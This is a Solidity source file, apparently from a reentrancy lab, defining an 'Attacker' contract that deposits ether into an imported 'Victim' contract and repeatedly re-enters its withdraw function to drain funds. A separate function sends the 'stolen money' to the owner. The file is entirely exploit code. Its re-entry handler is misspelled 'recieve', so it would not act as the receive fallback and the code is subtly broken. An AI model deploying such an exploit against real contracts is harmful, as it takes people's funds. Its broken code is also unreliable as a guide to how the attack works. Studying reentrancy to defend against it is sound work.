// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;
import "./Victim.sol";
contract Attacker {

    Victim public victim;
    address private owner;

    constructor(address poorvictim){
        owner = msg.sender;
        victim = Victim(poorvictim);
    }

    function attack() public payable {
        require(msg.value>=1 ether,"Send me some ETH to start");
        victim.deposit{value: 1 ether}();

        victim.withdraw();

    }

    function recieve() public payable{
        if(address(victim).balance>=1 ether){
            victim.withdraw();
        }
    }

    function withdrawstolenmoney() public {
        require(msg.sender == owner ,"Not your money");
        payable(owner).transfer(address(this).balance);
    }
}